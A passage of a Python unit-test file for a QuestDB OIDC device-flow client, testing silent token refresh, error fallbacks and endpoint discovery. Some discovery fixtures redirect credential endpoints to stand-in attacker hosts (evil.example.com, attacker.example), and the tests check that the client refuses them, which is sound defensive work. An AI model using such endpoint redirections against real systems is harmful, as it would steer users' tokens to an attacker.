        # no poll — rather than hanging until the device code expires.
        from questdb.auth import _render
        auth = self.make_auth(interactive=None)  # fall through to auto-detection
        fake_ip = types.ModuleType('IPython')
        fake_ip.get_ipython = lambda: types.SimpleNamespace(
            kernel=types.SimpleNamespace(_allow_stdin=False))
        with mock.patch.object(_render, 'in_ipython_kernel', return_value=True), \
                mock.patch.dict(sys.modules, {'IPython': fake_ip}):
            with self.assertRaises(OidcInteractionRequired):
                auth.token()
        self.assertEqual(self.state.device_requests, 0)
        self.assertEqual(self.state.token_requests, [])


class TestRefresh(AuthTestBase):
    def _seed_expired(self, auth, refresh_token='REFRESH-1'):
        expired = TokenSet(
            access_token='old-access', id_token='old-id',
            refresh_token=refresh_token,
            expires_at=self._clock.now() - 10)
        auth._cache.store(auth.cache_key, expired)

    def test_silent_refresh(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)  # no re-prompt

    def test_noninteractive_token_refuses_device_flow(self):
        # M5: the SQLAlchemy pool callback fetches the token with
        # allow_interactive=False so a browser prompt never blocks a pool thread.
        # With nothing cached and no refresh token, it must raise a clear
        # OidcInteractionRequired WITHOUT starting the device flow.
        auth = self.make_auth()
        with self.assertRaises(OidcInteractionRequired):
            auth._token(allow_interactive=False)
        self.assertEqual(self.state.device_requests, 0)        # flow never ran
        self.assertEqual(len(self.state.token_requests), 0)

    def test_noninteractive_token_still_silently_refreshes(self):
        # M5: a non-interactive caller (a pool thread) still performs a SILENT
        # refresh of an expired token — only the interactive device flow is
        # refused, never the refresh. No prompt.
        auth = self.make_auth()
        self._seed_expired(auth)
        self.assertEqual(auth._token(allow_interactive=False), ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)

    def test_skew_window_triggers_proactive_refresh(self):
        # The point of the cache+skew design: a token still within its lifetime
        # but inside the 30s clock-skew margin is refreshed PROACTIVELY (silently
        # via the refresh_token) so a fresh connection never races a mid-flight
        # 401 — and with no device prompt. Every other refresh test seeds a
        # fully-expired token (valid even at skew=0); this is the only end-to-end
        # exercise of the skew window itself. See M4.
        auth = self.make_auth()
        now = self._clock.now()
        seeded = TokenSet(
            access_token='old-access', id_token='old-id',
            refresh_token='REFRESH-1',
            issued_at=now - 50,    # 65s lifetime, so the adaptive cap
            expires_at=now + 15)   # (lifetime/2) doesn't bite -> full 30s skew
        # Not actually expired (still valid at skew=0), but inside the real skew.
        self.assertTrue(seeded.is_valid(now, skew=0))
        self.assertFalse(seeded.is_valid(now))
        self.assertLess(now, seeded.expires_at)
        auth._cache.store(auth.cache_key, seeded)

        token = auth.token()

        self.assertEqual(token, ID_TOKEN)                 # groups mode -> id_token
        self.assertEqual(self.state.refresh_requests, 1)  # refreshed once...
        self.assertEqual(self.state.device_requests, 0)   # ...with NO prompt
        self.assertEqual(
            self.state.refresh_forms[0]['refresh_token'], 'REFRESH-1')
        # The refreshed token is cached: a second call neither refreshes nor
        # prompts (it is now far from expiry).
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)

    def test_refresh_failure_falls_back_to_device_flow(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (400, {'error': 'invalid_grant'})
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 1)  # re-prompted

    def test_non_string_refresh_error_falls_back_not_crashes(self):
        # M1 (end-to-end): a refresh rejected with a NON-STRING error must still
        # fall back to a fresh device flow, not crash. The terminal
        # OidcDeviceFlowError _refresh raises is caught by _acquire's
        # 'except OidcError'; before the fix a raw TypeError raised DURING that
        # exception's construction slipped past the handler and aborted token().
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (400, {'error': {'obj': 'denied'}})
        token = auth.token()                              # must not raise
        self.assertEqual(token, ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 1)   # fell back to sign-in

    def test_refresh_token_preserved_when_not_rotated(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 3600})  # no new refresh
        auth.token()
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')

    def test_rotated_refresh_token_is_stored(self):
        # When the IdP DOES rotate the refresh token, the new one must replace
        # the old in the cached token set — else an IdP with one-time-use
        # refresh tokens breaks on the NEXT refresh.
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-2',  # rotated
            'token_type': 'Bearer', 'expires_in': 3600})
        auth.token()
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-2')
        self.assertEqual(self.state.device_requests, 0)  # no re-prompt

    def test_refresh_without_id_token_falls_back_to_device_flow(self):
        # groups_in_token=True but the IdP's refresh omits the id_token: the
        # refresh is unusable, so fall back to the interactive flow rather than
        # caching it and looping (the device flow yields a complete token).
        auth = self.make_auth(groups_in_token=True)
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})  # no id_token
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)            # from the device flow
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 1)  # fell back

    def test_refresh_without_id_token_non_interactive_does_not_loop(self):
        # Same situation but non-interactive: surface a clear error rather than
        # repeatedly re-running a refresh that can never satisfy _select. The
        # doomed refresh_token must be evicted on the first failure so a later
        # call goes straight to the (failing) device flow instead of re-issuing
        # the same fruitless refresh on every token() call. Calling token()
        # several times must therefore not climb the refresh count.
        auth = self.make_auth(groups_in_token=True, interactive=False)
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})  # no id_token
        for _ in range(3):
            with self.assertRaises(OidcInteractionRequired):
                auth.token()
        # Exactly one refresh across all three calls (without the eviction the
        # stale token would be reloaded and re-refreshed every call).
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)

    def test_refresh_without_access_token_falls_back_to_device_flow(self):
        # m8: the symmetric case of the groups_in_token=True test above.
        # groups_in_token=False, but the IdP's refresh omits the access_token
        # (the kind _select returns in this mode): the refresh is unusable, so
        # fall back to the interactive device flow rather than caching it and
        # looping.
        auth = self.make_auth(groups_in_token=False)
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'id_token': ID_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})  # no access_token
        token = auth.token()
        self.assertEqual(token, ACCESS_TOKEN)            # from the device flow
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 1)  # fell back

    def test_cached_token_missing_required_kind_is_refreshed(self):
        # A cached, non-expired token that lacks the required kind (here:
        # access_token in non-groups mode) must not pass the cache gate and
        # then hard-fail in _select; it should trigger a refresh instead.
        auth = self.make_auth(groups_in_token=False)
        auth._cache.store(auth.cache_key, TokenSet(
            access_token=None, id_token='id', refresh_token='REFRESH-1',
            expires_at=self._clock.now() + 3600))
        token = auth.token()
        self.assertEqual(token, ACCESS_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)

    def test_refresh_network_error_propagates_without_reprompt(self):
        # Both endpoints point at a closed port (same origin, so the co-location
        # check passes), so the refresh POST fails at the transport layer. The
        # error must propagate from the *token* endpoint (the refresh), proving
        # the flow did NOT fall back to the device flow on a transient blip.
        clock = FakeClock()
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint='http://127.0.0.1:1/device',
            token_endpoint='http://127.0.0.1:1/token',  # connection refused
            scope='openid groups', groups_in_token=True,
            insecure=True, interactive=True, renderer=Renderer(),
            _clock=clock)
        expired = TokenSet(
            access_token='old', id_token='old-id', refresh_token='REFRESH-1',
            expires_at=clock.now() - 10)
        auth._cache.store(auth.cache_key, expired)

        with self.assertRaises(OidcNetworkError) as cm:
            auth.token()
        # The error is from the refresh (token endpoint), not a device-flow
        # fallback (device endpoint), and the refresh token is kept for a retry.
        self.assertIn('/token', str(cm.exception))
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')

    def test_refresh_transient_5xx_kept_for_retry(self):
        # A transient IdP error (5xx) during a silent refresh must NOT tear the
        # session down and re-prompt: the refresh token is still valid, so it is
        # surfaced as a retryable OidcNetworkError and the cached token (with its
        # refresh token) is kept for a later retry — matching the poll loop,
        # which also treats 5xx/429 as transient. M2.
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (503, {'error': 'temporarily_unavailable'})
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)   # NOT re-prompted
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')  # kept

    def test_refresh_transient_429_kept_for_retry(self):
        # Same as the 5xx case for a 429 rate-limit. M2.
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (429, {'error': 'slow_down'})
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')

    def test_refresh_includes_audience_when_configured(self):
        # The audience is re-sent on refresh (mirroring the device-auth
        # request), so an IdP that scopes `aud` per request keeps it on the
        # rotated token instead of minting one QuestDB rejects after a silent
        # refresh. When no audience is configured the param is omitted.
        auth = self.make_auth(audience='questdb-api')
        self._seed_expired(auth)
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(
            self.state.refresh_forms[-1].get('audience'), 'questdb-api')

        # Without an audience, the refresh form carries no audience key.
        _MEMORY_STORE.clear()
        _MEMORY_GENERATION.clear()
        self.state.refresh_forms.clear()
        auth2 = self.make_auth()  # no audience
        self._seed_expired(auth2)
        auth2.token()
        self.assertNotIn('audience', self.state.refresh_forms[-1])

    def test_empty_audience_normalized_and_not_sent_on_refresh(self):
        # An empty-string audience is normalized to None in __init__, so it is
        # omitted on refresh too (it was previously sent as `audience=` on
        # refresh only, never on device-auth).
        _MEMORY_STORE.clear()
        _MEMORY_GENERATION.clear()
        auth = self.make_auth(audience='')
        self.assertIsNone(auth.config.audience)
        self._seed_expired(auth)
        auth.token()
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertNotIn('audience', self.state.refresh_forms[-1])

    def test_refresh_transient_5xx_non_interactive_does_not_hard_fail(self):
        # The worst case: in a non-interactive context (papermill / cron / CI) a
        # transient refresh error must surface as a retryable OidcNetworkError,
        # NOT escalate to OidcInteractionRequired — which a fall-through to the
        # device flow would raise, hard-failing a session whose refresh token is
        # still valid and would succeed on the next attempt. M2.
        auth = self.make_auth(interactive=False)
        self._seed_expired(auth)
        self.state.refresh_response = (503, {'error': 'temporarily_unavailable'})
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)

    def test_refresh_non_json_5xx_kept_for_retry(self):
        # A NON-JSON 5xx during a silent refresh (an HTML error page from a proxy
        # in front of the token endpoint) makes post_form RAISE OidcError(status=)
        # rather than return a JSON body — exercising _refresh's `except OidcError`
        # transient arm, distinct from the status-based arm a JSON 5xx hits (the
        # poll loop has the analogous non-JSON coverage; the refresh path did not).
        # It must surface as a retryable OidcNetworkError with the refresh token
        # kept, NOT re-prompt. M2.
        from questdb.auth._device import REFRESH_GRANT
        auth = self.make_auth()
        self._seed_expired(auth)
        real_idp_post = auth._idp_post

        def flaky(url, form):
            if form.get('grant_type') == REFRESH_GRANT:
                raise OidcError('proxy <html>503</html>', status=503)
            return real_idp_post(url, form)

        auth._idp_post = flaky
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)            # NOT re-prompted
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')  # kept

    def test_refresh_non_json_4xx_falls_back_to_device_flow(self):
        # A NON-JSON 4xx during a silent refresh (an HTML/plain rejection from a
        # WAF/proxy) is terminal, not transient: post_form RAISES OidcError(status=)
        # and _refresh's `except OidcError` non-transient arm re-raises, so
        # _acquire falls through to a fresh interactive sign-in rather than keeping
        # the rejected refresh token. The device-code POST and the subsequent poll
        # go through the real (JSON) mock IdP, so the flow completes. M2.
        from questdb.auth._device import REFRESH_GRANT
        auth = self.make_auth()
        self._seed_expired(auth)
        real_idp_post = auth._idp_post

        def flaky(url, form):
            if form.get('grant_type') == REFRESH_GRANT:
                raise OidcError('proxy <html>forbidden</html>', status=403)
            return real_idp_post(url, form)

        auth._idp_post = flaky
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)                 # from the device flow
        self.assertEqual(self.state.device_requests, 1)   # fell back / re-prompted


class TestDiscovery(AuthTestBase):
    def test_from_questdb_reads_settings(self):
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid groups',
            'acl.oidc.groups.encoded.in.token': True,
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        self.assertEqual(auth.config.client_id, 'questdb')
        self.assertTrue(auth.config.groups_in_token)
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_groups_mode_defaults_to_access_token_when_unset(self):
        # /settings omits acl.oidc.groups.encoded.in.token: the helper mirrors
        # the QuestDB server default (groups NOT encoded in the token) and sends
        # the access_token rather than the id_token.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        self.assertFalse(auth.config.groups_in_token)
        self.assertEqual(auth.token(), ACCESS_TOKEN)

    def test_settings_path_only_endpoints_not_assembled(self):
        # We do NOT assemble endpoint URLs from acl.oidc.host / port /
        # tls.enabled (matching the Java client). A path-only endpoint reads as
        # absent, so with no issuer to drive .well-known discovery, from_questdb
        # fails with a clear OidcConfigError instead of building a URL from the
        # host/port/tls building blocks.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.host': 'idp.example.com',
            'acl.oidc.port': 443,
            'acl.oidc.tls.enabled': True,
            'acl.oidc.token.endpoint': '/oauth/token',
            'acl.oidc.device.authorization.endpoint': '/oauth/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(
                self.base, insecure=True, renderer=Renderer())

    def test_user_writable_preferences_cannot_override_config(self):
        # A user-writable "preferences" sibling in /settings must never override
        # the trusted "config" object during discovery: end-to-end, the resolved
        # credential endpoints come from "config", not the attacker's prefs.
        self.state.settings = {
            'config': {
                'acl.oidc.enabled': True,
                'acl.oidc.client.id': 'questdb',
                'acl.oidc.scope': 'openid groups',
                'acl.oidc.groups.encoded.in.token': True,
                'acl.oidc.token.endpoint': self.base + '/token',
                'acl.oidc.device.authorization.endpoint': self.base + '/device',
            },
            'preferences.version': 1,
            'preferences': {
                'acl.oidc.token.endpoint': 'https://evil.example.com/token',
                'acl.oidc.device.authorization.endpoint':
                    'https://evil.example.com/device',
            },
        }
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        self.assertEqual(auth.config.token_endpoint, self.base + '/token')
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_well_known_fallback_for_device_endpoint(self):
        # Settings advertise OIDC + token endpoint but NOT the device endpoint;
        # issuer= is pinned, so the IdP .well-known fallback is allowed.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid',
            'acl.oidc.groups.encoded.in.token': False,
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        auth = OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                           insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')

    def test_discovery_doc_issuer_mismatch_rejected(self):
        # RFC 8414 §3.3: the discovery document's own `issuer` MUST match the
        # issuer it was fetched from. A document served at the pinned issuer's
        # origin that self-declares a DIFFERENT issuer (a misconfigured or
        # wrong-tenant IdP) is refused rather than having its cross-origin-trusted
        # endpoints used to route the device-code / refresh-token POSTs.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': 'https://other-tenant.example.com',
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        with self.assertRaises(OidcConfigError) as cm:
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                       insecure=True, renderer=Renderer())
        self.assertIn('issuer', str(cm.exception))

    def test_discovery_doc_issuer_trailing_slash_tolerated(self):
        # The issuer match is trailing-slash-insensitive, so a document that
        # declares the issuer with a trailing slash (a common IdP spelling) is
        # accepted rather than spuriously rejected.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': self.base + '/',
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        auth = OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                           insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')

    def test_device_fallback_without_issuer_is_rejected(self):
        # M4: QuestDB advertises the token endpoint but not the device
        # endpoint, and no issuer is pinned. Discovery would otherwise be
        # steered by the (possibly tampered) /settings response, so refuse and
        # demand an out-of-band issuer pin — even though a usable .well-known
        # is reachable here, it must NOT be fetched.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        with self.assertRaises(OidcConfigError) as cm:
            OidcDeviceAuth.from_questdb(self.base, insecure=True)
        self.assertIn('issuer', str(cm.exception))

    def test_oidc_disabled_raises(self):
        self.state.settings = {'config': {'acl.oidc.enabled': False}}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_missing_device_endpoint_raises(self):
        # issuer= is pinned (so the fallback is allowed), but the IdP's
        # discovery doc carries no device_authorization_endpoint: that is the
        # error under test, not the missing-issuer guard above.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {'issuer': self.base,
                                 'token_endpoint': self.base + '/token'}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_non_dict_well_known_doc_raises_config_error(self):
        # M2: an IdP discovery document that is valid JSON but not an object
        # (a list/null/number/string from a captive portal, a misconfigured
        # proxy, or a hostile IdP) must surface as a typed OidcConfigError, not
        # a raw AttributeError from doc.get(...). issuer= is pinned so the
        # fallback is allowed; the doc's shape is the error under test.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = []  # valid JSON, but not an object
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_malformed_endpoint_port_raises_config_error(self):
        # /settings advertising a non-integer port in an endpoint must raise
        # OidcConfigError (the typed contract), not a bare ValueError that
        # callers catching OidcError would miss. See M6.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://idp:notaport/token',
            'acl.oidc.device.authorization.endpoint':
                'https://idp:notaport/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_endpoint_origin_mismatch_rejected(self):
        # /settings advertises the device endpoint on a different origin than
        # the token endpoint: refuse rather than POST credentials off-origin.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint':
                'http://127.0.0.2:9/device',  # different host:port
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_issuer_pin_rejects_off_origin_endpoints(self):
        # Endpoints are internally consistent, but an explicit issuer pins them
        # to a different origin -> reject (a compromised /settings can't
        # redirect the token POST when the IdP is pinned).
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(
                self.base, issuer='https://idp.attacker.example',
                insecure=True)

    def test_issuer_pin_accepts_matching_origin(self):
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        auth = OidcDeviceAuth.from_questdb(
            self.base, issuer=self.base, insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')

    def test_settings_endpoint_off_issuer_origin_confirmed_by_discovery(self):
        # Google-style IdP: /settings advertises the token endpoint on a
        # DIFFERENT origin than the pinned issuer, and the device endpoint is
        # discovered. The IdP's own .well-known (fetched from the pinned issuer)
        # advertises the SAME off-origin token endpoint, which authoritatively
        # confirms it — so it is accepted despite not being on the issuer origin.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://oauth2.idp.example/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': 'https://oauth2.idp.example/token',
            'device_authorization_endpoint':
                'https://oauth2.idp.example/device',
        }
        auth = OidcDeviceAuth.from_questdb(
            self.base, issuer=self.base, insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.token_endpoint,
                         'https://oauth2.idp.example/token')
        self.assertEqual(auth.config.device_authorization_endpoint,
                         'https://oauth2.idp.example/device')

    def test_settings_endpoint_confirmed_despite_trailing_slash(self):
        # M2 regression: a split-origin IdP whose /settings token endpoint sits
        # off the issuer ORIGIN is confirmed by the IdP's own (TLS-fetched)
        # discovery document — but the two sources SPELL the one endpoint slightly
        # differently (an explicit :443 and a trailing slash here). The
        # confirmation is compared on the canonical endpoint form, not by raw
        # string equality, so the trivial spelling difference still counts as
        # confirmed and the endpoint is ACCEPTED. An exact-string test wrongly
        # rejected this (a real Google / Auth0 / Azure deployment whose /settings
        # spelling differs from the IdP document's).
        from questdb.auth import _discovery
        issuer = 'https://accounts.idp.example'
        settings = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://oauth2.idp.example/token'}
        well_known = {  # SAME endpoint, spelled with explicit :443 + trailing '/'
            'issuer': issuer,
            'token_endpoint': 'https://oauth2.idp.example:443/token/',
            'device_authorization_endpoint':
                'https://oauth2.idp.example/device'}
        with mock.patch.object(_discovery, 'fetch_settings',
                               return_value=settings), \
             mock.patch.object(_discovery, 'discover_device_endpoint_from_idp',
                               return_value=well_known):
            cfg = _discovery.resolve_config(
                questdb_url='https://qdb.example.com:9000', issuer=issuer)
        # The /settings spelling is kept as the resolved value; it was accepted
        # because the IdP document confirmed the same canonical endpoint.
        self.assertEqual(cfg.token_endpoint, 'https://oauth2.idp.example/token')

    def test_settings_endpoint_confirmation_keeps_query_distinct(self):
        # M2: the canonical confirmation still treats a DIFFERING QUERY STRING as
        # a different credential-routing target — a /settings token endpoint whose
        # query differs from the IdP document's is NOT confirmed, so the
        # off-issuer-origin pin rejects it. Guards the widened confirmation
        # against becoming too loose.
        from questdb.auth import _discovery
        issuer = 'https://accounts.idp.example'
        settings = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint':
                'https://oauth2.idp.example/token?tenant=EVIL'}
        well_known = {
            'issuer': issuer,
            'token_endpoint': 'https://oauth2.idp.example/token?tenant=good',
            'device_authorization_endpoint':
                'https://oauth2.idp.example/device'}
        with mock.patch.object(_discovery, 'fetch_settings',
                               return_value=settings), \
             mock.patch.object(_discovery, 'discover_device_endpoint_from_idp',
                               return_value=well_known):
            with self.assertRaises(OidcConfigError) as cm:
                _discovery.resolve_config(
                    questdb_url='https://qdb.example.com:9000', issuer=issuer)
        self.assertIn('issuer', str(cm.exception).lower())

    def test_settings_off_origin_token_not_confirmed_by_discovery_rejected(self):
        # The flip side of the confirmed case: /settings advertises an
        # off-issuer-origin token endpoint that the IdP discovery document does
        # NOT match (a tampered redirect). It is rejected — the device endpoint
        # is discovered on the SAME (attacker) origin only so co-location passes
        # and the issuer-origin pin is what does the rejecting.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://attacker.example/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': 'https://oauth2.idp.example/token',
            'device_authorization_endpoint': 'https://attacker.example/device',
        }
        with self.assertRaises(OidcConfigError) as cm:
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)
        self.assertIn('issuer', str(cm.exception).lower())

    def test_settings_both_endpoints_off_issuer_origin_rejected(self):
        # When /settings advertises BOTH credential endpoints off the issuer
        # origin, there is no IdP discovery round-trip to confirm them (both are
        # present), so they cannot be trusted on the untrusted /settings channel
        # -> reject. Pass them explicitly, or omit one so discovery confirms it.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://oauth2.idp.example/token',
            'acl.oidc.device.authorization.endpoint':
                'https://oauth2.idp.example/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_settings_endpoint_off_issuer_path_confirmed_by_discovery(self):
        # Regression: a path-bearing issuer (Azure-AD-style `.../{tenant}/v2.0`)
        # whose token endpoint sits OFF the issuer PATH but on its origin,
        # advertised by /settings and CONFIRMED verbatim by the IdP's own
        # (TLS-fetched) discovery document, must be ACCEPTED — the issuer-PATH
        # pin shares the same discovery-confirmation exemption as the issuer-
        # ORIGIN pin, and both now run AFTER discovery. The device endpoint is
        # absent from /settings, so it is discovered. Before the fix the PATH
        # check ran before discovery with no exemption and wrongly rejected this.
        from questdb.auth import _discovery
        issuer = 'https://idp.example.com/tenant/v2.0'
        settings = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            # off the issuer PATH (/tenant/v2.0), but on the issuer ORIGIN:
            'acl.oidc.token.endpoint':
                'https://idp.example.com/tenant/oauth2/v2.0/token'}
        well_known = {
            'issuer': issuer,
            'token_endpoint':
                'https://idp.example.com/tenant/oauth2/v2.0/token',
            'device_authorization_endpoint':
                'https://idp.example.com/tenant/oauth2/v2.0/devicecode'}
        with mock.patch.object(_discovery, 'fetch_settings',
                               return_value=settings), \
             mock.patch.object(_discovery, 'discover_device_endpoint_from_idp',
                               return_value=well_known):
            cfg = _discovery.resolve_config(
                questdb_url='https://qdb.example.com:9000', issuer=issuer)
        self.assertEqual(cfg.token_endpoint,
                         'https://idp.example.com/tenant/oauth2/v2.0/token')
        self.assertEqual(cfg.device_authorization_endpoint,
                         'https://idp.example.com/tenant/oauth2/v2.0/devicecode')

    def test_settings_endpoint_off_issuer_path_not_confirmed_rejected(self):
        # The flip side: an off-issuer-PATH /settings token endpoint (a tampered
        # /settings steering credentials to a different realm on the same host)
        # that the IdP discovery document does NOT confirm stays REJECTED — the
        # exemption only lifts the pin for the exact URL the IdP itself advertised.
        from questdb.auth import _discovery
        issuer = 'https://idp.example.com/realms/prod'
        settings = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint':
                'https://idp.example.com/realms/EVIL/token'}
        well_known = {
            'issuer': issuer,
            'token_endpoint':  # the IdP advertises a DIFFERENT token endpoint
                'https://idp.example.com/realms/prod/token',
            'device_authorization_endpoint':
                'https://idp.example.com/realms/prod/device'}
        with mock.patch.object(_discovery, 'fetch_settings',
                               return_value=settings), \
